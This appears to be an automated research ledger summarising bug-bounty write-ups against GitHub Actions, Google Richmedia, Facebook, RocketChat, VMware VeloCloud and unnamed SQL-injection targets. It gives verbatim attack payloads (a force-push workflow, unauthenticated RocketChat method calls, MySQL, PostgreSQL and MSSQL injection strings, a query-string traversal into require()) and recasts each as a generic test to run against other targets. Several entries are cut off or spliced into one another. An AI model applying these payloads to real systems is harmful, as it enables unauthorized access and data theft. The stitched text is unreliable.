SOURCE: https://blog.tyage.net/posts/2021-04-02-improper-access-control-github-workflow/  2026-11-11
ROUTE: live `web_extract` served the COMPLETE article incl. the workflow YAML and the timeline — no fallback needed. tyage (namatyage), published 2021-04-02; reported to the GitHub Bug Bounty Program 2021-02-05 12:09 UTC; $25,000 bounty awarded 2021-03-31.
STATUS: UNVERIFIED (not reproduced — the platform bug lived 2021-02-04 18:42 UTC -> 2021-02-05 13:35 UTC and is fixed; the TEST remains transferable to token-scoping misconfigurations)
CLASS: CI/CD privilege escalation / improper access control — a fork's `pull_request`-triggered job received a `GITHUB_TOKEN` with WRITE scope on the PARENT repository -> unauthorized force-push to the parent's main branch
CORE METHOD:
  1. THE QUESTION, verbatim: "if the `GITHUB_TOKEN` for the target repository is shared for the jobs triggered by pull request, we gain write permission of the respository without authorization!"
  2. THE TEST, verbatim steps: "1. Victim prepares a repository which has random workflow file in `.github/workflows`. (Make sure the attacker has no permission to commit the repository.) 2. Attacker forks the repository and replace the workflow file" with `on: [pull_request]` / `runs-on: ubuntu-latest` / `uses: actions/checkout@v2` / then `echo test > newfile` -> `git add newfile` -> `git commit -m "Add changes" -a` -> `git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${GITHUB_REPOSITORY}` -> `git push --force origin HEAD:refs/heads/main`. "3. Attacker sends a pull request to the parent repository and waits for a while."
  3. THE RESULT, verbatim: "Surprisingly, the test was succeeded. After the workflow finishes, victim repository has been modified!" — force-push to the parent's `main` by a user with NO repository permission. "protected branch is safe :)" — branch protection was the only mitigation that held.
  4. SIBLING BUG (named on the page, found one day earlier by Teddy Katz): "Stealing arbitrary GitHub Actions secrets" — "a similar bug... also exists in GitHub Actions and is triggered by crafted pull request" (independent; not detailed on this page).
DETECTION SIGNAL: a workflow that runs on `pull_request` (or any fork-reachable trigger) and uses `${{ secrets.GITHUB_TOKEN }}` for a WRITE action (push, release, package publish); a `git remote set-url`/API call whose target is `${{ github.repository }}` = the BASE repo executed from a fork job; `permissions: contents: write` on a PR-triggered job.
CHAIN: any GitHub user with no permission on the target (primitive: fork + pull request = untrusted input) -> the PR triggers a workflow running with a `GITHUB_TOKEN` scoped to the PARENT repository (bug/misconfiguration: the token crosses the trust boundary) -> the attacker-supplied workflow body executes `git push --force origin HEAD:refs/heads/main` with that token (bypass: authentication of the JOB substitutes for authorization of the USER) -> arbitrary content/history written to the target's main branch -> every downstream consumer (releases, CI secrets, package registries) runs attacker code (impact: write access to arbitrary repositories; GitHub paid $25,000).
TRANSFERABLE TEST: on every target repo with Actions: fork it, add/replace a workflow `on: [pull_request]` whose step is `git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${GITHUB_REPOSITORY}` + `git push --force origin HEAD:refs/heads/main` (or an API write), open a PR, and check whether the parent repo changes. If it does, the PR-triggered job holds a write token for the base repo (a `pull_request_target`-style misconfiguration or a platform scoping bug). Rule: **test the token's SCOPE from the untrusted side — a fork PR must never receive write access to the parent; branch protection mitigates only where the push lands, not what the token can do elsewhere.**
DEDUPE/DELTA: `namatyage`, `x-access-token`, `tyage`+Actions, `edit the main branch` = 0 hits across the three write targets. Related-but-recorded REVIEWED, NOT re-recorded: the pwn-request primitive (§17.404 "fork + PR triggers privileged workflow_run"; §17.436's "`pull_request_target` pwn request" cache chain), §17.556 (required-review bypass via `GITHUB_TOKEN` — an INSIDER with Write, different threat model), the GitHub-Actions expression-injection class (ledger 4179/21608). NEW DELTA: the explicit TOKEN-SCOPING PROBE for fork-triggered jobs (the exact push workflow) and the historical platform-bug case where plain `pull_request` from a fork carried the BASE repo's write token ($25,000). NO §17 slot — the CI untrusted-PR class is established; this entry is the scope-probe carrier.
FRESHNESS: published 2021-04-02 (bug window Feb 2021, fixed in ~19 hours) — outside the preferred 6-12 month window; read because assigned. The specific platform bug is long fixed; the probe catches today's `pull_request_target`/token-scope misconfigurations.
SOURCE: https://www.ehpus.com/post/multiple-authorization-bypass-issues-in-google-s-richmedia-studio  2026-11-11
ROUTE: live `web_extract` served the COMPLETE article (ehpus / Wix-hosted blog by zohar shachar, "Multiple Authorization bypass issues in Google's Richmedia Studio") incl. all findings and conclusions — no fallback needed. In-body screenshots are images this pass could not read, but the prose states every method.
STATUS: UNVERIFIED (not reproduced — Google Richmedia Studio is invite-gated and the bugs were fixed 2020-2021; the method is transferable)
CLASS: BAC / IDOR — authorization gaps in an app whose UI HIDES the surface: a FAIL-OPEN role check (zero-grant role sees everything), an enumerable direct-file-link IDOR, and a serialized-object-ID swap.
CORE METHOD:
  1. FAIL-OPEN ROLE CHECK ("fail to true"): create an account with NO QA-dashboard access (the limited role — its dashboard renders with fewer nav items). Then NAVIGATE DIRECTLY to the QA page URL the UI hid. The server's permission check treats an EMPTY grant set as allow-all — verbatim: "By some weird 'fail to true' bug, if you have permission to see nothing, you could see everything!" The limited user saw "all campaigns, of all accounts."
  2. ENUMERABLE DIRECT-LINK IDOR: uploaded files land on a separate cookie-less domain `s0.2mdn.net`. The long "preview" link is unguessable, but the upload's network response returns a SECOND, simpler DIRECT link — accessible with NO auth. That direct link's first 8 digits = the enumerable merchant ID; the rest = upload date + a short random number -> brute-forceable. Read other users' uploaded files.
  3. GWT SERIALIZED-OBJECT-ID SWAP: the file-download-URL GWT RPC POST body carries short strings (`DlQXE`/`DlQWU`) that are the campaign IDs. Log in as a second user, capture ITS campaign IDs, replay them with the FIRST user's cookies -> get the second user's file-download URLs. The IDs are short/guessable -> enumerate more.
DETECTION SIGNAL: an app whose UI HIDES a surface (nav item absent, page "navigates away" for unauthorized accounts) — the UI gate is not enforcement, test the URL directly; a role with zero/no explicit grants answering 200 with full data; an upload served on a separate cookie-less domain whose "direct" (non-preview) link is enumerable (structured prefix + timestamp + short-random); a serialized object ID (GWT/Java/protobuf) in a POST body where swapping another account's ID returns their data.
CHAIN: a low-privilege account with no grants (primitive) -> fail-open permission check + enumerable direct links + swapped serialized object IDs (three bypasses) -> full cross-tenant read of ALL accounts' campaigns and uploaded files (impact: BAC/IDOR across the platform; $500 + $5000 + $500 from Google).
TRANSFERABLE TEST: (PRIMARY — fail-open) create the LOWEST-PRIVILEGE / zero-permission role, then GET every privileged page URL the UI hides from you directly — a 200 with full data = the empty-grant-set-is-allow-all bug. (SECONDARY) on any file-upload served from a separate domain, diff the "preview" link vs the "direct" link in the network responses and enumerate the direct link's structured prefix (org/merchant id + timestamp + short-random); and on any serialized-object-ID RPC, replay a second account's object ID with the first account's session. Rule: **the UI hiding a surface is not authorization — a zero-grant role must be DENIED, and an "unguessable" link is guessable when its components are enumerable.**
DEDUPE/DELTA: `ehpus`, `Richmedia`, `richmedia studio`, `2mdn.net`, `zohar`, `fail to true`, `fail-to-true` = 0 hits across the three write targets. Related-but-recorded REVIEWED, NOT re-recorded: the preview-link material (ledger 4743) is "preview path serves protected content" (a different bug — gated preview vs public); the generic IDOR/BOLA playbook (§3); the serialized/object-ID swap carriers (§17.411 GraphQL object-ID -> derived-ID). NEW DELTA: the FAIL-OPEN zero-grant role ("permission to see nothing = see everything") as a distinct authz bug class, plus the cookie-less upload-domain DIRECT-link enumeration (merchant-ID + timestamp + short-random). NEW general method -> §17.567.
FRESHNESS: published 2021-03-24 (bugs found during an Oct 2020 Google research grant) — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19  2026-11-11
ROUTE: live `web_extract` served the COMPLETE article (Alaa Abdulridha / alaa0x2, "How I hacked Facebook: Part Two") incl. both conclusions and the bounty note — no fallback needed. In-body screenshots are images this pass could not read, but the prose establishes every step; names/details were changed at Facebook's request.
STATUS: UNVERIFIED (not reproduced — the target is Facebook's internal legal-department app; not reproducible against a lab this pass)
CLASS: authentication bypass / ATO via .ASPXAUTH forgery (ASP.NET Forms-Auth machineKey REUSE across deployments) -> chained to Internal SSRF.
CORE METHOD:
  1. FINGERPRINT: the session cookie is `.ASPXAUTH` (ASP.NET Forms Authentication). Forging it needs the machineKey: `validationKey`, `decryptionKey`, `decryptionIV`, `decryptionMethod`. Verbatim: "ASPXAUTH indicates 80% it's vulnerable."
  2. THE KEY IS REUSED, NOT RECOVERED — verbatim: "I proceeded to google and searched for other websites that utilized the same application — I assumed here that I will be lucky and find a website that utilizes the same application and same encryption keys." He found a SIBLING site running the same app with registration OPEN and the SAME machineKey.
  3. THE USERNAME COLLISION: register on the sibling with a username EQUAL to the target admin's username; capture YOUR OWN valid `.ASPXAUTH`; verbatim: "I took the ASPXAUTH and replaced it with the Facebook expired ASPXAUTH" -> the token is accepted on the TARGET -> logged in as the admin. Verbatim: "I was able to login using any admin account just by knowing the username."
  4. THE CHAIN (ATO -> Internal SSRF): from the gained admin session he uploaded a script into the app's editor that sends arbitrary requests (GET/POST/PUT/PATCH/HEAD/OPTIONS) to any URL internal/external -> full Internal SSRF reaching `intern.our.facebook.com`; verbatim: "I was able to escalate this vulnerability to RCE, LFI if I go a little further." A privileged URL-fetch/upload feature becomes the SSRF client.
DETECTION SIGNAL: an `.ASPXAUTH` / Forms-Auth / stateless-signed-cookie session (also JWT, Rails `secret_key_base`, Flask `SECRET_KEY`) where MULTIPLE deployments/apps share the SAME signing key; a sibling instance of the same app with registration open; an admin login reachable "just by knowing the username" once a valid token for that username exists; an authenticated feature that fetches/arbitrarily requests a URL (file-import, editor preview, webhook) = SSRF pivot.
CHAIN: attacker with no account (primitive) -> finds a SIBLING deployment sharing the machineKey with registration open (primitive: shared signing key) -> registers a username colliding with the target admin, mints a valid .ASPXAUTH on the sibling (primitive: token for the victim's username) -> replays it on the TARGET = login as the admin (authentication bypass / ATO) -> uses the admin's privileged editor/upload to plant a request-forging script (bypass: the privileged feature becomes the SSRF client) -> arbitrary GET/POST/PUT/PATCH/HEAD/OPTIONS to ANY internal URL incl. `intern.our.facebook.com` (impact: ATO of any admin + Internal SSRF into the Facebook internal network; the author cites the FB SSRF payout guideline of $40,000 + $5,000 bonus; 5-figure bounty paid).
TRANSFERABLE TEST: on any stateless-signed-token app (`.ASPXAUTH`, JWT, Rails/Flask/Django session cookie): (1) find SIBLING deployments of the same app (framework fingerprints, shared base image/AMI, config leaks, default keys); (2) if a sibling has open registration, register a username equal to a target privileged user; (3) capture YOUR OWN valid token and replay it against the TARGET for that username — it authenticates as the victim. Then pivot: any authenticated URL-fetch/import/editor feature in the gained session is an SSRF client. Rule: **a signed session token is portable wherever its signing key is shared — you don't need to recover the key, only mint a token on a sibling app with a colliding identity.**
DEDUPE/DELTA: `ASPXAUTH`, `.ASPXAUTH`, `machineKey`, `machine key`, `validationKey`, `decryptionKey`, `FormsAuth`, `alaa0x2`, `intern.our.facebook.com` = 0 hits across the three write targets. Related-but-recorded REVIEWED, NOT re-recorded: the "forge a signed token after RECOVERING the key from config/defaults" family (ledger 7834: Airflow CVE-2020-17526 / Flask-cookie forging / Redash default config) — DIFFERENT mechanism (that recovers the key; this never needs the key, only a SIBLING deployment's legitimately-issued token); §17.8 "default/empty signing key" is the DEFAULT-key variant, distinct from this REUSE variant. NEW DELTA: the SIBLING-DEPLOYMENT shared-key token PORTABILITY (your own legit token for a colliding username = admin token) and the ATO -> editor -> Internal-SSRF chain. NEW general method -> §17.566.
FRESHNESS: published 2021-03-18 (part one bounty $7,500; part two a 5-figure bounty) — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://blog.teddykatz.com/2021/03/10/fork-collab-abuse.html  2026-11-11
ROUTE: live `web_extract` served the COMPLETE article (Teddy Katz / not-an-aardvark, "Messing with GitHub's fork collaboration for fun and profit") incl. the timeline and the six-endpoint observation — no fallback needed.
STATUS: UNVERIFIED (not reproduced — GitHub fixed these in 2021; the TEST remains transferable to any create-vs-edit authorization divergence)
CLASS: BAC / authorization bypass — a permission check enforced on the CREATE endpoint is MISSING on the EDIT/PATCH endpoint, so a privileged flag is flipped post-hoc.
CORE METHOD:
  1. THE FEATURE: GitHub fork collaboration ("Allow edits from maintainers") grants the BASE-repo maintainers write access to the PR's HEAD branch. You may normally only grant it if YOU have write access to the head branch.
  2. THE PROTECTED PATH (blocked at CREATE): a PR FROM someone else's branch TO your repo with fork-collab ON would grant YOU write to THEIR branch — GitHub blocks it: `"Fork collab can't be granted by someone without permission"` (the checkbox doesn't even appear in the UI).
  3. THE BYPASS (the bug) — verbatim: "GitHub was only doing this validation when a user created a pull request. When a user edited an existing pull request with the REST API, GitHub seemed to apply a looser set of validations." So: (a) create the PR with fork-collab DISABLED (passes the create check), (b) then EDIT the PR via the REST API to ENABLE fork collaboration -> you obtain write access to someone else's head branch. The check that gates the flag is not re-run on the edit endpoint.
  4. THE GENERAL LESSON (the author's framing) — verbatim: "at least six endpoints separately implementing the same access controls for the fork collaboration checkbox" (UI-create, UI-edit, REST-create, REST-edit, GraphQL-create, GraphQL-edit) get "out of sync... a recipe for bugs and incomplete security fixes." The create and edit endpoints of the SAME action enforce the check inconsistently.
DETECTION SIGNAL: any state-changing object with a PRIVILEGED FLAG (allow-edits / collaborator / sharing / public / owner / permissions) validated on CREATE but settable on an EDIT/PATCH/PUT/GraphQL-mutation route; a REST/GraphQL update endpoint that applies "looser validations" than the create endpoint; multiple endpoint families (UI-create, UI-edit, REST-create, REST-edit, GraphQL-create, GraphQL-edit) implementing one authorization with divergent code.
CHAIN: a user with NO write access to a victim's resource (primitive) -> creates the object with the privileged flag OFF (passes the create-time check) -> PATCHes the object via the REST/GraphQL EDIT endpoint to turn the flag ON (bypass: the edit endpoint skips the create-time permission check) -> gains write access to the victim's branch/resource (impact: unauthorized write to another user's resource; GitHub fixed it). The same divergence applies to any toggleable privilege flag.
TRANSFERABLE TEST: for every object with a privileged flag validated at creation, capture BOTH the CREATE request and the EDIT/PATCH/PUT (or GraphQL mutation) request; create the object with the flag OFF, then use the EDIT endpoint to set it ON and observe whether the "you need permission to grant this" check fires. If it doesn't, the flag's authorization is create-only. Test every endpoint family (UI-create, UI-edit, REST-create, REST-edit, GraphQL-create, GraphQL-edit) independently. Rule: **a permission check on CREATE is not a permission check on EDIT — the update endpoint is where a privileged flag gets flipped without re-authorization.**
DEDUPE/DELTA: `fork collab`, `fork-collab`, `allow edits`, `allow edits from maintainers`, `not-an-aardvark`, `aardvark`, `teddykatz`+fork, `Fork collab can't be granted` = 0 hits across the three write targets (the only `teddykatz` hit is the SIBLING-BUG mention inside the tyage entry, ledger 16711 — a different bug). Related-but-recorded REVIEWED, NOT re-recorded: the tyage GITHUB_TOKEN-scope entry (batch 200) is a DIFFERENT GitHub bug (PR-triggered workflow token scoping, not fork-collab flag validation); §17.556 required-review bypass is an INSIDER threat model. NEW DELTA: the CREATE-vs-EDIT authorization DIVERGENCE as a general method (validate a privileged flag's check across every update endpoint). NEW general method -> §17.565.
FRESHNESS: published 2021-03-10 (GitHub fixed 2021) — outside the preferred 6-12 month window; read because assigned. The specific fork-collab bug is long fixed; the create-vs-edit probe catches today's update-endpoint authorization gaps.

SOURCE: https://securifyinc.com/disclosures/rocketchat-unauthenticated-access-to-messages  2026-11-11
ROUTE: live `web_extract` served the COMPLETE disclosure (Securify, Rojan Rijal, "RocketChat - Unauthenticated access to messages") incl. both PoC requests and the nuclei-template link — no fallback needed.
STATUS: UNVERIFIED (not reproduced — no RocketChat instance was touched this pass; the payload requests are verbatim from the disclosure; a nuclei template exists)
CLASS: authentication bypass / unauthorized data access — an unauthenticated method-dispatch (`method.callAnon`) reaches sensitive methods lacking the `userId()` guard -> unauthenticated read of public + private channel messages.
CORE METHOD:
  1. THE DISPATCH: RocketChat gates API methods by whether they go through `method.call` (authRequired) or `method.callAnon` (no auth). Verbatim: "I started to look into sensitive functions that did not perform additional authentication checks. For example, most of the functions performed a second validation through `if (!Meter.userId())` [sic — the `Meteor.userId()` guard]... One of the functions that did not perform this check was the `livechat:registerGuest`."
  2. MINT A GUEST TOKEN (no auth): `POST /api/v1/method.callAnon/anythingresearch` with `X-Auth-Token: null` and body `{"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"ok4782\",\"name\":\"Security\",\"email\":\"attacker@email.com\"}],\"id\":\"123\"}"}` -> registers a guest with `token: ok4782` (fields: token, name, email, department).
  3. READ MESSAGES with that token: `livechat:loadHistory`, `params:[{"token":"ok4782","rid":"GENERAL"}]` — verbatim: "most channels of RocketChat use alpha-numeric IDs, the GENERAL channel simply uses GENERAL as the ID" -> read the GENERAL channel unauthenticated.
  4. ESCALATE TO PRIVATE DMs: "Each user messages are also considered channels... The channel ID for private messages is a concatenation of ID of two users." Harvest user IDs from GENERAL, then "using Burp Intruder's ClusterBomb feature, iterate through all possible combinations to access private messages of the users." Nuclei template: `vulnerabilities/rocketchat/unauth-message-read.yaml`.
DETECTION SIGNAL: an unauthenticated method/RPC dispatch (`method.callAnon`, JSON-RPC, DDP, WebSocket RPC) that forwards to server methods; a sensitive method (registerGuest, loadHistory, sendMessage, ...) reachable WITHOUT the `if (!userId)` guard; a guest/anonymous token that authorizes reads across rooms; a predictable room/channel id (`GENERAL`) or a derived id (concatenated user-ID pair) addressable in the `rid` param.
CHAIN: unauthenticated attacker (primitive: method.callAnon needs no session) -> calls `livechat:registerGuest` to mint a guest token (bypass: the method skips the `userId()` guard) -> `livechat:loadHistory` with `rid=GENERAL` reads the public channel (primitive: unauth message read) -> harvests user IDs and enumerates `rid=<userID1><userID2>` pairs (ClusterBomb) -> reads PRIVATE DMs between arbitrary users (impact: unauthenticated disclosure of public + private messages = critical; nuclei-testable).
TRANSFERABLE TEST: on any app with an unauthenticated RPC/method dispatch (Meteor `method.callAnon`, JSON-RPC, GraphQL, DDP): (1) enumerate the methods reachable WITHOUT auth; (2) for each, check whether it enforces `userId()`/session — the ones that skip it AND read/modify sensitive data are the finding; (3) mint any anonymous/guest identity the app offers and use it as the read token; (4) for message/room reads, note the id scheme — a literal like `GENERAL` is directly addressable, and a derived id (concatenated user-ID pair) is enumerable by ClusterBomb after harvesting ids from the public room. Rule: **audit the unauthenticated method dispatch — the methods that skip the `userId()` guard are the hole, and a guest token plus a guessable/derived room id turns it into full message disclosure.**
DEDUPE/DELTA: `registerGuest`, `loadHistory`, `rid=GENERAL`, `ok4782`, `Rojan Rijal`, `unauth-message-read`, `securifyinc` = 0 hits across the three write targets (`livechat` hits are only the Twilio `livechat/sms-incoming` SSRF, ledger 13721 / §17.457 — a different livechat surface). Related-but-recorded REVIEWED, NOT re-recorded: the Rocket.Chat Autotranslate-DDP unauth-private-message entry (ledger 9885) reaches the SAME impact via a DIFFERENT method (autotranslate DDP); the `method.callAnon` DISPATCH is already known as the unauth path (ledger 10672, getPasswordPolicy NoSQLi); §17.457 is the Twilio SMS-webhook SSRF. NEW DELTA: the `livechat:registerGuest` guest-token mint + `livechat:loadHistory` rid read + the DM rid = concatenated user-ID pair ClusterBomb, and the general "audit unauth method-dispatch for missing-userId-guard methods" rule. Recorded as a ledger carrier (the general rule is captured in CORE METHOD / TRANSFERABLE TEST; not promoted to §17 this pass).
FRESHNESS: disclosure date printed only as "Mar 1" (NO YEAR on the fetched page); RocketChat fixed it (the linked nuclei template is in projectdiscovery/nuclei-templates) — outside the preferred 6-12 month window; read because assigned.

CLASS: BAC / sensitive information disclosure — the CMS editor's STRUCTURED CONTENT BODY accepts object-REFERENCE nodes and internal-only node types the editor UI never offers, so a document you create can embed and LEAK another internal CMS object's content.
CORE METHOD:
  1. ENTRY: Facebook Workplace "Knowledge Library" CMS WYSIWYG (`https://TESTING.workplace.com/work/knowledge/`, admin of a Workplace account). Create a Category -> "Blank page" -> Publish; intercept the `/api/graphql/` call (UI-flow doc_id=2674517216004073) and take the `document` id from its `variables`.
  2. REPLAY a second mutation as a logged-in user: `fb_dtsg=YOUR_CSRF_TOKEN&__a=1&doc_id=3078946742160079&variables={"input":{"client_mutation_id":"23","actor_id":"ACTOR_ID","xml":"XXX","document":"DOC_ID","status":"DRAFT"}}` where XXX is the CMS content XML you fully control.
  3. BYPASS 1 — OBJECT-REFERENCE NODE: place a reference to ANOTHER CMS object's id in the `xml` body — verbatim: "the possibility to reference other CMS object inside the CMS object we're creating which would leak" its content -> the referenced object's content (e.g. internal hire documents) is disclosed inside yours. THE PAYOFF: the finalize step writes a NEW object at `scontent.*.fbcdn.net` — verbatim: "The internal file was copied to another file accessible in a public CDN" — and REGENERATES A VALID URL SIGNATURE for content that is deleted or privacy-changed. SOURCE: https://marxchryz.medium.com/my-bug-bounty-journey-and-my-first-critical-bug-time-based-blind-sql-injection-aa91d8276e41  2026-11-11
ROUTE: served COMPLETE by live web_extract (no fallback needed).
STATUS: UNVERIFIED (not reproduced — reporter's own timeline; no lab this pass).
CLASS: SQL injection (time-based blind) in an ORDER BY clause — backend/version fingerprint via MySQL versioned-comment oracle when delay functions and boolean operators are blocked.
CORE METHOD:
  1. ENTRY: a sortable table's sort params — `?order=type&ordering=ASC&search=` (author: "the ASC value seems familiar... 'SELECT * FROM referrals ORDER BY type ASC'"). `order=type'` -> HTTP 500 = SQLi in the ORDER BY clause. `order by 18` works but `union select 1,2,...18` does NOT — UNION and error-echo are impossible after ORDER BY (blank 500, no error text).
  2. FILTER MAP: bare `sleep(10)--`, `benchmark(1000000000,md5(1))--`, `pg_sleep(10)--`, `; WAITFOR DELAY '00:00:10';--` all fail; boolean `if(1=1,1,(select 1 union select 2))` vs `if(1>2,...)` fail too — "it appears that the =,< and > is blocked." All engines' payloads fail, so do not guess.
  3. THE ORACLE (new): fingerprint the exact backend/version with MySQL versioned comments `/*!500NN <invalid>*/` (executes only if version >= 5.00.NN). Brute-force per digit with Burp Intruder: `/*!50731someInvalidSQLSyntax*/` -> 500 (version >= that) vs `/*!50732someInvalidSQLSyntax*/` -> 200 (version < that) = version 5.7.31 -> confirmed MySQL, so only the `sleep()`/`benchmark()` family needs testing.
  4. WORKING DELAY: the nested-subquery wrapper `(select*from(select(sleep(10)))a)` (where bare `sleep(10)--` did not) -> 10s then 30s delay confirmed.
DETECTION SIGNAL: SQLi in a sort/ORDER BY parameter (`order=`, `orderby=`, `sort=`, `ordering=ASC`) where `order by N` enumerates columns but `union select` and error-echo return nothing (only a 500/200 binary oracle); delay functions and `=`,`<`,`>` blocked.
CHAIN: ORDER BY injection (primitive) -> UNION/error-based impossible (context constraint) -> `/*!500NN*/` digit-oracle fingerprints MySQL 5.7.31 (esc. narrows payloads) -> nested-subquery `sleep()` -> time-based blind -> full DB read (P1). The `/*!500NN*/` oracle is the load-bearing new link.
TRANSFERABLE TEST: on a sort/ORDER BY SQLi with only 500/200 feedback: (1) confirm `order by N` + failed `union select`; (2) brute-force `/*!500NN<invalid>*/` per digit with Intruder to pin the MySQL version and confirm the engine; (3) run that engine's delay family with the nested wrapper `(select*from(select(sleep(N)))a)`. Rule: **fingerprint the exact engine/version with versioned comments before choosing delay payloads — a binary error oracle is enough to read `/*!500NN*/`.**
DEDUPE/DELTA: `someInvalidSQLSyntax`, `50731`, `version oracle`, `/*!5` = 0 hits across the three write targets (the only `/*!50000` hit is ledger 628, `/*!50000OR*/` as a WAF comment-bypass — a different use). The nested-subquery sleep wrapper `(select(…)from(select(…)…)x)` is ALREADY RECORDED (ledger 3579/3581). NEW DELTA: using MySQL versioned comments `/*!500NN*/` as a digit-by-digit BACKEND-VERSION ORACLE under binary (500/200) feedback. Narrow technique — recorded as a ledger carrier, NOT promoted to §17 this pass.

SOURCE: https://www.shawarkhan.com/2020/11/exploiting-blind-postgresql-injection.html  2026-11-11
ROUTE: the live domain is now a PARKED/for-sale page (article gone); recovered COMPLETE via the Wayback Machine snapshot https://web.archive.org/web/20220618131853/https://www.shawarkhan.com/2020/11/exploiting-blind-postgresql-injection.html (read via curl + text extraction). Shawar Khan, Synack, published 2020-11-30.
STATUS: UNVERIFIED (not reproduced — Synack target, no lab this pass).
CLASS: SQL injection (blind error-based -> data exfiltration) in PostgreSQL via psycopg2/SQLAlchemy, on a Plotly Dash `_dash-update-component` endpoint.
CORE METHOD:
  1. ENTRY: user-creation JSON `POST /endpoint/_dash-update-component`, `state:[{"id":"newUsername","property":"value","value":"test1"},...]` — the `newUsername` value is concatenated into `CREATE SCHEMA <username>`. Unhandled Python exception (no try/except) REFLECTS the psycopg2/SQLAlchemy error in the JSON response = error readback channel. Duplicate create -> `New User not created: (psycopg2.errors.DuplicateSchema) schema "test1" already exists\n\n[SQL: CREATE SCHEMA test1]`.
  2. STACKED QUERY + quote position: `testuser1;TEST` -> `syntax error at or near "TEST"` (psycopg2 `PQexec` runs multi-statement); input is NOT inside quotes ("unclosed quotation errors").
  3. WHITESPACE FILTER BYPASS (new): spaces are converted to `_` (`test1 AND SELECT version()` -> `test1_and_select_version()`); `/**/` works but the Python-specific trick is `\n`, `\r`, `\t` as separators — "I was able to use them as separators of queries. This worked as the application was using python." 80-char input cap (`StringDataRightTruncation ... character varying(80)`).
  4. TYPE-CAST ERROR-ECHO EXFIL (core, new): `t;SELECT\nversion()::int` (or `SELECT CAST(version() AS INTEGER)`) forces `invalid input syntax for type integer: "PostgreSQL 12.3 …"` — the SELECTed value is echoed in the conversion error. Shorter `::int` beats `CAST(... AS ...)` (23 vs 45 chars).
  5. ROW COLLAPSE (new): multi-row subqueries hit `CardinalityViolation) more than one row returned by a subquery`; collapse with `array_to_string(array_agg(<col>),',')::int from <table>` (e.g. `from pg_database`, `from pg_tables`) to dump all names in one error; single rows via `limit 1 offset N`.
  6. ENUM ORACLES: table/column existence via error text (`UndefinedTable` vs `UndefinedColumn`), and PG `HINT: Perhaps you meant to reference the column "pg_user.passwd"` leaks near-miss column names. Dumps `userdata` email + SHA256 password ("DROP, CREATE and Modify any table").
DETECTION SIGNAL: a JSON/RPC endpoint echoing unhandled DB-driver exceptions; `CREATE SCHEMA <input>`-style concatenation; multi-statement `;` accepted (psycopg2); a space->`_` filter; PostgreSQL `invalid input syntax` / `CardinalityViolation` / `HINT:` in responses.
CHAIN: user-controlled name -> stacked `;` SQL (psycopg2 multi-statement) -> `\n` bypasses the space filter -> `::int` type-cast echoes any `SELECT` in the conversion error (blind error-based read) -> `array_to_string(array_agg(...))` collapses rows past CardinalityViolation -> full DB/table/column + `userdata` email & SHA256 hash -> DROP/CREATE/modify any table (Critical).
TRANSFERABLE TEST: on any Python/psycopg2 or PG app reflecting driver errors: (1) confirm stacked `;` and quote-position; (2) if spaces are filtered, use `\n`/`\t`/`/**/`; (3) run `<inj>;SELECT\n<any_expr>::int` and read the value out of `invalid input syntax`; (4) collapse lists with `array_to_string(array_agg(<col>),',')::int from <tbl>`; use PG `HINT` for column names. Rule: **when errors are reflected but values are not, force a type-cast error — the value you selected is printed in the conversion failure.**
DEDUPE/DELTA: `array_to_string`, `array_agg`, `CardinalityViolation`, `invalid input syntax`, `pg_user.passwd`, `DuplicateSchema`, `_dash-update-component`, `newUsername`, `::int` exfil = 0 hits across the three write targets. `psycopg2` appears only as a generic multi-statement note (Bugbountyskills 11220/11223). Related-but-recorded: V-01 error-based extraction (`CAST(… AS INT)` / `EXTRACTVALUE`) records the type-cast-error primitive; NEW DELTA is the psycopg2/Dash carrier + `array_to_string(array_agg(...))::int` row-collapse + `\n` whitespace bypass + PG `HINT:` column oracle. NEW general method -> §17.571.

CLASS: authentication bypass (Pass-the-Hash password-reset) -> LFI/file-inclusion -> RCE chain (also CVE-2020-3984 non-blind SQLi `modulus`). VMware VeloCloud Orchestrator (nginx + node.js).

Attacker needs only the hash + a `logicalId` param — "Both are predefined and can be obtained from the installation files. These values do not change between instances."
  2. `req.originalUrl` QUERY-STRING TRAVERSAL -> `require()` LFI (CVE-2020-4000, core new): `portal/rest/meta` builds the file to `require` from `req.originalUrl`; `..` in the URL PATH is normalized away by the webserver, but `originalUrl` includes the QUERY STRING where `..` survives -> `/portal/rest/meta/none?test/%2E%2E/%2E%2E/…/somefile.js` = "execute almost any JavaScript file on the local disk".

The `originalUrl` traversal and the syslog filename leak are the load-bearing new links.
TRANSFERABLE TEST: (1) on any app whose file-`require`/include derives from `req.originalUrl`/full URL, send `..` AFTER the `?` (query string) to traverse where path-normalization can't reach; (2) if uploads are content-restricted but failed ones persist and a log/syslog target is configurable, forward logs to yourself to recover the random filename and include it; (3) reset any account whose reset key equals/derives from a known/default hash (or `{CLEAR}` token) to re-enable+login. SOURCE: https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-an-exploitable-boolean-one-85d6be3ca23b  2026-11-11

STATUS: UNVERIFIED (not reproduced — Synack target, no lab this pass).
CLASS: SQL injection (blind error-based converted to BOOLEAN) — MSSQL, IIS/.aspx, 2-state oracle via the redirect target (Location header).
CORE METHOD:
  1. ENTRY + ORACLE: param `name` (IIS/.aspx -> assume MSSQL).   2. ERROR-BASED -> BOOLEAN CONVERT (core new): the app shows only Error.aspx vs AccessDenied.aspx (not the error text). Wrap a boolean in a type-conversion whose SUCCESS/FAILURE flips the page: `'+convert(char,(SELECT IIF(SUBSTRING(DB_NAME(),1,1)='A',3,@@VERSION)))+'` — TRUE branch returns `3` (convert to char SUCCEEDS -> AccessDenied.aspx = true); FALSE branch returns `@@VERSION` (convert FAILS -> Error.aspx = false). (`convert(char,db_name())` -> AccessDenied = query ran; `convert(int,db_name())` -> Error.)
  3. EXTRACT: Burp Intruder Cluster Bomb — payload set #1 = char-index numbers, #2 = charset A-Z 0-9 `_`; grep the Location header (Error.aspx vs AccessDenied.aspx) per pair to read `db_name()` char-by-char.
